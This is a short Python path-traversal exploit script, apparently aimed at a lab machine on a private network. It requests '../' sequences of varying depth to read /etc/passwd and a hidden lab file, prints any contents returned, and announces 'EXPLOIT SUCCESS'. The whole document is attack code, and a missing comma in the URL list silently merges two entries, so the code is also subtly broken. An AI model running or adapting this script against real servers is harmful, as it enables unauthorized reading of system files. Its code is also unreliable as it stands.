import requests

target_url = "http://192.168.1.101"

test_urls = [
    f"{target_url}/../../etc/passwd/foo.txt",
    f"{target_url}/../../../etc/passwd/foo.txt",
    f"{target_url}/../../../../etc/passwd/foo.txt"
    f"{target_url}/../../opt/lab/hidden/foo.txt",
    f"{target_url}/../../../opt/lab/hidden/foo.txt",
    f"{target_url}/../../../../opt/lab/hidden/foo.txt"
]

for url in test_urls:
    try:
        response = requests.get(url, timeout=5)
        print(f"Testing URL: {url}")
        print(f"Status Code: {response.status_code}")
        if response.status_code == 200:
            print("Response Content:")
            print(response.text)
            print("✓ EXPLOIT SUCCESS!")
        print("-" * 40)
    except Exception as e:
        print(f"Error accessing {url}: {e}")
        print("-" * 40)
    